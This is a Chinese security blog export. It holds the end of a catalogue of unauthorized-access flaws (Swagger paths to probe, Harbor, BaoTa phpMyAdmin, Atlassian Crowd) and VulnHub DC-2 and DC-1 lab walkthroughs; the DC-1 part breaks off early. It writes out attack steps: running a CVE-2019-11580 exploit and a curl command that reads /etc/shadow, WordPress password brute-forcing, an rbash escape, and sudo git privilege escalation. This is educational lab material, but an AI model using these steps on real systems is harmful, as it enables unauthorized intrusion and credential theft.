class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">/api</span><br><span class="line"></span><br><span class="line">/api-docs</span><br><span class="line"></span><br><span class="line">/api-docs/swagger.json</span><br><span class="line"></span><br><span class="line">/api.html</span><br><span class="line"></span><br><span class="line">/api/api-docs</span><br><span class="line"></span><br><span class="line">/api/apidocs</span><br><span class="line"></span><br><span class="line">/api/doc</span><br><span class="line"></span><br><span class="line">/api/swagger</span><br><span class="line"></span><br><span class="line">/api/swagger-ui</span><br><span class="line"></span><br><span class="line">/api/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/api/swagger-ui.html/</span><br><span class="line"></span><br><span class="line">/api/swagger-ui.json</span><br><span class="line"></span><br><span class="line">/api/swagger.json</span><br><span class="line"></span><br><span class="line">/api/swagger/</span><br><span class="line"></span><br><span class="line">/api/swagger/ui</span><br><span class="line"></span><br><span class="line">/api/swagger/ui/</span><br><span class="line"></span><br><span class="line">/api/swaggerui</span><br><span class="line"></span><br><span class="line">/api/swaggerui/</span><br><span class="line"></span><br><span class="line">/api/v1/</span><br><span class="line"></span><br><span class="line">/api/v1/api-docs</span><br><span class="line"></span><br><span class="line">/api/v1/apidocs</span><br><span class="line"></span><br><span class="line">/api/v1/swagger</span><br><span class="line"></span><br><span class="line">/api/v1/swagger-ui</span><br><span class="line"></span><br><span class="line">/api/v1/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/api/v1/swagger-ui.json</span><br><span class="line"></span><br><span class="line">/api/v1/swagger.json</span><br><span class="line"></span><br><span class="line">/api/v1/swagger/</span><br><span class="line"></span><br><span class="line">/api/v2</span><br><span class="line"></span><br><span class="line">/api/v2/api-docs</span><br><span class="line"></span><br><span class="line">/api/v2/apidocs</span><br><span class="line"></span><br><span class="line">/api/v2/swagger</span><br><span class="line"></span><br><span class="line">/api/v2/swagger-ui</span><br><span class="line"></span><br><span class="line">/api/v2/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/api/v2/swagger-ui.json</span><br><span class="line"></span><br><span class="line">/api/v2/swagger.json</span><br><span class="line"></span><br><span class="line">/api/v2/swagger/</span><br><span class="line"></span><br><span class="line">/api/v3</span><br><span class="line"></span><br><span class="line">/apidocs</span><br><span class="line"></span><br><span class="line">/apidocs/swagger.json</span><br><span class="line"></span><br><span class="line">/doc.html</span><br><span class="line"></span><br><span class="line">/docs/</span><br><span class="line"></span><br><span class="line">/druid/index.html</span><br><span class="line"></span><br><span class="line">/graphql</span><br><span class="line"></span><br><span class="line">/libs/swaggerui</span><br><span class="line"></span><br><span class="line">/libs/swaggerui/</span><br><span class="line"></span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/swagger</span><br><span class="line"></span><br><span class="line">/swagger-resources</span><br><span class="line"></span><br><span class="line">/swagger-resources/configuration/security</span><br><span class="line"></span><br><span class="line">/swagger-resources/configuration/security/</span><br><span class="line"></span><br><span class="line">/swagger-resources/configuration/ui</span><br><span class="line"></span><br><span class="line">/swagger-resources/configuration/ui/</span><br><span class="line"></span><br><span class="line">/swagger-ui</span><br><span class="line"></span><br><span class="line">/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/swagger-ui.html#/api-memory-controller</span><br><span class="line"></span><br><span class="line">/swagger-ui.html/</span><br><span class="line"></span><br><span class="line">/swagger-ui.json</span><br><span class="line"></span><br><span class="line">/swagger-ui/swagger.json</span><br><span class="line"></span><br><span class="line">/swagger.json</span><br><span class="line"></span><br><span class="line">/swagger.yml</span><br><span class="line"></span><br><span class="line">/swagger/</span><br><span class="line"></span><br><span class="line">/swagger/index.html</span><br><span class="line"></span><br><span class="line">/swagger/static/index.html</span><br><span class="line"></span><br><span class="line">/swagger/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/swagger/ui/</span><br><span class="line"></span><br><span class="line">/Swagger/ui/index</span><br><span class="line"></span><br><span class="line">/swagger/ui/index</span><br><span class="line"></span><br><span class="line">/swagger/v1/swagger.json</span><br><span class="line"></span><br><span class="line">/swagger/v2/swagger.json</span><br><span class="line"></span><br><span class="line">/template/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/user/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/user/swagger-ui.html/</span><br><span class="line"></span><br><span class="line">/v1.x/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/v1/api-docs</span><br><span class="line"></span><br><span class="line">/v1/swagger.json</span><br><span class="line"></span><br><span class="line">/v2/api-docs</span><br><span class="line"></span><br><span class="line">/v3/api-docs</span><br></pre></td></tr></table></figure><p>2、swagger-ui未直接部署在IP根目录下</p><p>使用burpsuite的插件：APIKit</p><p>介绍：<a href="https://www.bilibili.com/read/cv15912732">https://www.bilibili.com/read/cv15912732</a></p><p>介绍：<a href="https://blog.csdn.net/qq_50854790/article/details/122894291">https://blog.csdn.net/qq_50854790/article/details/122894291</a></p><h2 id="漏洞修复-28"><a href="#漏洞修复-28" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>设置访问权限</p><h1 id="Harbor未授权添加管理员漏洞"><a href="#Harbor未授权添加管理员漏洞" class="headerlink" title="Harbor未授权添加管理员漏洞"></a>Harbor未授权添加管理员漏洞</h1><h2 id="漏洞简介-29"><a href="#漏洞简介-29" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Harbor未授权添加任意管理员漏洞。攻击者可通过构造特定的字符串，在未授权的情况下直接创建管理员账号，从而接管Harbor镜像仓库。</p><h2 id="漏洞检测-29"><a href="#漏洞检测-29" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>漏洞地址：<a href="http://10.101.20.111/harbor/sign-in">http://10.101.20.111/harbor/sign-in</a></p><h2 id="漏洞修复-29"><a href="#漏洞修复-29" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>尽快升级到安全版本，下载链接参考：</p><p><a href="https://github.com/goharbor/harbor/releases">https://github.com/goharbor/harbor/releases</a></p><h1 id="Windows-ipc共享未授权访问漏洞"><a href="#Windows-ipc共享未授权访问漏洞" class="headerlink" title="Windows ipc共享未授权访问漏洞"></a>Windows ipc共享未授权访问漏洞</h1><h2 id="漏洞简介-30"><a href="#漏洞简介-30" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-30"><a href="#漏洞检测-30" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-30"><a href="#漏洞修复-30" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="宝塔phpmyadmin未授权访问"><a href="#宝塔phpmyadmin未授权访问" class="headerlink" title="宝塔phpmyadmin未授权访问"></a>宝塔phpmyadmin未授权访问</h1><h2 id="漏洞简介-31"><a href="#漏洞简介-31" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>宝塔Linux面板7.4.2版本和Windows面板6.8版本存在phpmyadmin未授权访问漏洞</p><p>phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。</p><h2 id="漏洞检测-31"><a href="#漏洞检测-31" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、目录扫描：&#x2F;pma   或者 &#x2F;phpmyadmin</p><p>2、漏洞URL：<a href="http://ip:888/pma">http://ip:888/pma</a></p><p>即可直接登录（但要求必须安装了phpmyadmin）</p><h2 id="漏洞修复-31"><a href="#漏洞修复-31" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="WordPress未授权访问漏洞"><a href="#WordPress未授权访问漏洞" class="headerlink" title="WordPress未授权访问漏洞"></a>WordPress未授权访问漏洞</h1><h2 id="漏洞简介-32"><a href="#漏洞简介-32" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-32"><a href="#漏洞检测-32" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-32"><a href="#漏洞修复-32" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="Atlassian-Crowd-未授权访问"><a href="#Atlassian-Crowd-未授权访问" class="headerlink" title="Atlassian Crowd 未授权访问"></a>Atlassian Crowd 未授权访问</h1><h2 id="漏洞简介-33"><a href="#漏洞简介-33" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。</p><p>Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码&#x2F;命令，从而获得服务器权限。</p><h2 id="漏洞检测-33"><a href="#漏洞检测-33" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>漏洞利用脚本github地址：<a href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p><p>git clone <a href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p><p>cd CVE-2019-11580&#x2F;</p><p>python CVE-2019-11580.py <a href="http://192.168.18.138:8095/">http://192.168.18.138:8095</a></p><p>curl  <a href="http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow">http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow</a></p><h2 id="漏洞修复-33"><a href="#漏洞修复-33" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>设置访问&#x2F;crowd&#x2F;admin&#x2F;uploadplugin.action的源ip。</p><p>升级最新版本(3.5.0以上)。</p><h1 id="PHP-FPM-Fastcgi未授权访问漏洞"><a href="#PHP-FPM-Fastcgi未授权访问漏洞" class="headerlink" title="PHP-FPM Fastcgi未授权访问漏洞"></a>PHP-FPM Fastcgi未授权访问漏洞</h1><h2 id="漏洞简介-34"><a href="#漏洞简介-34" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-34"><a href="#漏洞检测-34" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-34"><a href="#漏洞修复-34" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="uWSGI未授权访问漏洞"><a href="#uWSGI未授权访问漏洞" class="headerlink" title="uWSGI未授权访问漏洞"></a>uWSGI未授权访问漏洞</h1><h2 id="漏洞简介-35"><a href="#漏洞简介-35" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-35"><a href="#漏洞检测-35" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-35"><a href="#漏洞修复-35" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="Kong未授权访问漏洞"><a href="#Kong未授权访问漏洞" class="headerlink" title="Kong未授权访问漏洞"></a>Kong未授权访问漏洞</h1><h2 id="漏洞简介-36"><a href="#漏洞简介-36" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-36"><a href="#漏洞检测-36" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-36"><a href="#漏洞修复-36" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h1 id="ThinkAdminV6未授权访问漏洞"><a href="#ThinkAdminV6未授权访问漏洞" class="headerlink" title="ThinkAdminV6未授权访问漏洞"></a>ThinkAdminV6未授权访问漏洞</h1><h2 id="漏洞简介-37"><a href="#漏洞简介-37" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h2 id="漏洞检测-37"><a href="#漏洞检测-37" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h2 id="漏洞修复-37"><a href="#漏洞修复-37" class="headerlink" title="漏洞修复"></a>漏洞修复</h2>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】DC-2攻略</title>
      <link href="/2022/dc-2-walkthrough/"/>
      <url>/2022/dc-2-walkthrough/</url>
      
        <content type="html"><![CDATA[<p>靶机链接：<a href="https://www.vulnhub.com/entry/dc-2,311/">DC: 2 ~ VulnHub</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.56.101/24</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670672682134-fe2ff33c-8998-4e3e-8bfb-d1a0854357ba.png" alt="img"></p><p>kali：192.168.56.101</p><p>靶机：192.168.56.105</p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTCV 192.168.56.105</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670672781181-0831f8f0-c49d-4229-a92f-0a783011e6e6.png" alt="img"></p><p>就扫到一个80端口，看来只能从web找突破口了</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>看以看到上面的扫描结果，80端口被重定向到<code>http://dc-2/</code>了，直接用ip访问的话，浏览器会自动跳到<code>http://dc-2/</code>这个站，而dns是不知道这个站的ip的，所以会打不开。</p><p>这时候我们要手动配置<code>hosts</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure><p>加上这一条解析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.105dc-2</span><br></pre></td></tr></table></figure><p>然后保存就好，打开网站就能看到了</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670673288165-4c9b2755-be6a-4d29-8d68-b91f9fe85f90.png" alt="img" style="zoom:33%;" /><p>用whatweb来看下网站的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.56.105/</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670673635705-74df0ebe-2516-4568-a6be-ea9fae43b1d9.png" alt="img"></p><p>可以看到，用了word press框架，版本是<strong>WordPress 4.7.10</strong></p><p>用searchsploit找了下，没有找到可以用的</p><p>接着又对目录进行爆破，没有发现有用的东西</p><p>看到Web站点的Flag提示，应该是要我们去爆破后台；而且一般的字典是爆破不出他的密码，flag提到了一个工具<code>cewl</code></p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670826157619-d0722724-c76f-4659-82b1-dd0ad0ba97a8.png" alt="img" style="zoom: 67%;" /><p>想到Kali里自带了一个专门针对wordpress的扫描器<code>wpscan</code>，那我们先用它来枚举一下看有哪些用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ --enumerate u</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从别的师傅那学到的</span></span><br><span class="line">nmap --script=vuln 192.168.56.105</span><br></pre></td></tr></table></figure><p>扫出3个用户</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670675879024-da27584b-dc23-417d-96f3-e633155470f1.png" alt="img"></p><p>接着用之前flag里提到的工具<code>cewl</code>来生成字典</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w pwd.txt</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670826789707-d36586bd-4361-4b4b-9d50-84ef8cddb119.png" alt="img"></p><p>可以看到，成功生成了字典，接着就用这个生成的字典，来爆破上面的三个用户</p><h2 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -P pwd.txt</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670827167046-69b9b9fd-d6ee-47bd-99aa-42fe929dc4a6.png" alt="img"></p><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>登录jerry用户，在post里面发现<code>flag2</code></p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670827624939-e858d7a6-bdb9-464c-95ca-7532d0201443.png" alt="img"></p><p>flag2：</p><p>如果你不能利用wordpess走捷径的话，还有其他办法</p><p>我又登录了<code>tom</code>，信息比jerry还少，pages里面就只有一篇文章，连flag都没有</p><p>之前打靶机是通过wordpress的插件写php拿到的shell，这里直接没看到入口。</p><p>跟着提示，从其他地方找突破口，之前扫出来的就一个80端口，除了这个wordpress也没啥了，提示说找其他突破口，也就是还有其他点，于是我重新扫了一遍全端口，看有没有其他的服务开放</p><h2 id="7744-SSH"><a href="#7744-SSH" class="headerlink" title="7744 SSH"></a>7744 SSH</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTVC 192.168.56.105 -p-</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670828657169-1577783e-4c26-440d-9af7-65ade9991dbc.png" alt="img"></p><p>扫出来一个<code>7744</code>端口，可以看到，运行的是SSH服务。肯定是修改了默认端口，把22改成7744了。</p><p>既然只有这一个多扫出来的端口，那就只有这里了，结合之前爆破出来的账号密码，连接试下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.56.105 -p 7744</span><br></pre></td></tr></table></figure><p>我先试了jerry的，因为他在web可以登录，然后失败了；</p><p>然后换成tom，连接成功了。</p><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670828978179-0734ebf8-8ab8-44b1-b0bd-0f377185e16e.png" alt="img"></p><p>如上图，习惯性打了一波<code>whoami</code>，居然执行不了，说没找到命令，先不管（其实后面还是要管）</p><p>拿到shell，先pwd，ls看一波</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ pwd</span><br><span class="line">/home/tom</span><br><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br></pre></td></tr></table></figure><p>看到个flag3.txt，习惯性<code>cat</code>看一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">-rbash: cat: command not found</span><br></pre></td></tr></table></figure><p>cat命令用不了，我没遇到过这种情况。有些机子<code>vim</code>用不了，因为没装，那我还能理解，我用<code>vi</code>就好，但是连cat都不能用，就觉得很奇怪了。但是也不知道是什么原因。</p><p>然后，flag3旁边还有个<code>usr</code>，<code>cd</code>进去看看。发现cd命令都用不了了。然后用<code>ls</code>去列出<code>usr</code>里面的东西，发现只有一个<code>bin</code>目录，然后在靠<code>ls</code>列出里面的东西。</p><p>发现有四个命令，猜测应该是<code>tom</code>这个用户可以执行的命令了。</p><p>我看了kali用户的home目录，以及我vps的home目录，里面都没有<code>/home/xxx/usr/bin</code>，应该是这个靶机特有的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ cd usr</span><br><span class="line">-rbash: cd: restricted</span><br><span class="line">tom@DC-2:~$ ls ./usr</span><br><span class="line">bin</span><br><span class="line">tom@DC-2:~$ ls usr/bin</span><br><span class="line">less  ls  scp  vi</span><br></pre></td></tr></table></figure><p>发现有<code>less</code>和<code>vi</code>，那随便就可以用这二者之一看到flag3里面的内容</p><p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p><p>看到<code>su</code>，我就感觉要切换用户<code>jerry</code>，但是能用的4个命令，不足以让我们切换到jerry</p><h2 id="rbash-绕过"><a href="#rbash-绕过" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h2><p>于是我上网找资料，才知道<code>rbash</code>这个东西</p><p>然后才注意到他的输出，和我右边的kali对比，是不一样的，他前面多了个<code>-rbash</code></p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670829506233-7ec16404-e33f-4b8b-91a3-285452a2ce40.png" alt="img"></p><p>查了下rbash，就是一个功能受限的bash，很多命令他用不了，但是可以逃逸（第一篇出来的就是rbash绕过）</p><p>按照网上的教程，开始绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入vi</span></span><br><span class="line">vi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令行:模式下输入</span></span><br><span class="line">setshell=/bin/bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令行：模式下输入</span></span><br><span class="line">shell</span><br></pre></td></tr></table></figure><p>然后跳出了vi，回到了shell界面</p><p>试着执行了几个命令，虽然是bash环境了，但一些命令还是无法执行，并且无法执行<code>su</code>命令</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670831149083-3f0af1ca-29dc-4574-bf16-fccd037be522.png" alt="img"></p><p>去看了别人的wp，发现还要导入环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure><h2 id="jerry-登场"><a href="#jerry-登场" class="headerlink" title="jerry 登场"></a>jerry 登场</h2><p>现在就可以切换用户了，输入密码，切换成功！</p><p>这里我其实有一点疑问，我对Linux不是特别了解。为啥之前ssh连接的时候，我先试的就是jerry，那个时候，提示认证失败，这里切换用户，还是那个密码，却可以成功切换？</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670831943798-bbc7cbb0-99a5-4499-a4eb-4a1bcb770ca6.png" alt="img"></p><p>切到jerry的home目录，发现了<code>flag4.txt</code></p><p>Good to see that you’ve made it this far - but you’re not home yet. </p><p>You still need to get the final flag (the only flag that really counts!!!).  </p><p>No hints here - you’re on your own now.  :-)</p><p>Go on - git outta here!!!!</p><p>没有提示，那就提权方法都试一下</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul><li>suid提权，没找到能用的命令</li><li>撞库，用tom和jerry的密码还有弱口令去撞root的密码，都是错误</li><li><code>sudo -l</code>，看到个git，网上搜了一下git提权，有东西！</li></ul><p>按照这个博客的教程 <a href="https://blog.csdn.net/G_Fu_Q/article/details/116276096">git提权方法</a></p><p>成功提权到root</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670832738247-925c1060-72a3-4b53-8603-da96ee804550.png" alt="img"></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>最后一步啦，去拿flag</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670832853253-5069b085-5062-404c-8373-d558f4c83255.png" alt="img"></p><p>完成~~~</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>nmap扫ip，端口，发现80端口</p><p>访问web服务，是个wp框架，拿到flag1：爆破用户，cewl</p><p>用wpscan扫描到用户名，根据flag1提示用cewl生成字典，爆破。得到tom和jerry的密码</p><p>web登录jerry，发现flag2提示我们从其他的点进行突破</p><p>于是我们重新扫描全端口，发现ssh被改到了7744端口，用tom连上了ssh，在tom的home目录下，我们看到了flag3，提示我们要换到jerry</p><p>要bash命令，我们要绕过rbash。成功切换到jerry</p><p>然后发现jerry可以不用密码执行git</p><p>git提权，done！</p><h2 id="总结-amp-收获"><a href="#总结-amp-收获" class="headerlink" title="总结&amp;收获"></a>总结&amp;收获</h2><p>疑惑</p><ul><li>ssh连不上jerry，su却可以，不知道为什么</li></ul><p>不足</p><ul><li>对于工具的使用，不是很熟练，哪个工具能干什么，不是特别清楚。知道要干啥，不知道要用什么工具</li></ul><p>收获</p><ul><li>知道了cewl这么个工具，其实有点diy字典的意思</li><li>rbash绕过，第一次接触到rbash</li><li>第一次遇到ssh改到其他端口，下次就知道了，常规没扫出22端口的，服务器没开ssh服务的可能性小，改了默认端口的可能性大</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】DC-1攻略</title>
      <link href="/2022/dc-1-walkthrough/"/>
      <url>/2022/dc-1-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><p>用nmap扫描c段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.56.101/24</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670418510041-29f9fce6-45e9-40b1-89a8-9edeed8d29dd.png" alt="img"></p><p>56.1是我的win10物理机，56.101是Kali，所以靶机IP是：192.168.56.104</p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTVC 192.168.56.104</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670418653313-037cc0df-d191-43de-bd2e-beb04161b75d.png" alt="img"></p><p>可以看到开了22，80和111端口</p><p>22和80比较熟悉了</p><p>111还不知道是个啥</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>用<code>whatweb</code>看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.56.104/</span><br><span class="line"></span><br><span class="line">&#123;http://192.168.56.104/ [200 OK] Apache[2.2.22], </span><br><span class="line">Content-Language[en], Country[RESERVED][ZZ], Drupal, </span><br><span class="line">HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], </span><br><span class="line">IP[192.168.56.104], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], </span><br><span class="line">PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], </span><br><span class="line">Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], </span><br><span class="line">X-Powered-By[PHP/5.4.45-0+deb7u14] &#125;</span><br></pre></td></tr></table></figure><p>可以看到，用的CMS叫<code>Drupal</code>，版本是<code>Drupal 7</code></p><h2 id="search-exp"><a href="#search-exp" class="headerlink" title="search exp"></a>search 